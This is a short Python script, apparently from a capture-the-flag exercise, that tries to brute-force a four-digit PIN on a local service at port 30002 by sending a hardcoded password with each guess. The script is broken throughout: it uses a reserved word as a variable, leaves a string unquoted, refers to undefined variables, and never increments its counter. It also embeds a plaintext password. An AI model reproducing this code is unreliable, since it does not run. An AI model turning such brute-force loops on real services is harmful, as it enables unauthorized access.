import sys                                                                       
import socket                                                                    
                                                                                    
code = 0                                                                         
pass = UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ                                          
                                                                                    
try:                                                                             
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                        
    s.connect(("localhost", 30002))                                             
                                                                                   
    while code < 1001:                                                          
        full_pin = str(code).zfill(4)                                           
        attempt = pass + "  " + full_pin + "\n"                                 
        s.sendall(message.encode())                                             
        received = s.recv(1024)                                                 
                                                                                   
        if "Wrong" in recieved:                                                 
            print("NOPE, not %s" % code)                                        
        else:                                                                   
            print(recieved)                                                     
            break                                                               
        ++pincode                                                               
                                                                                   
finally                                                                         
    sys.exit(1)
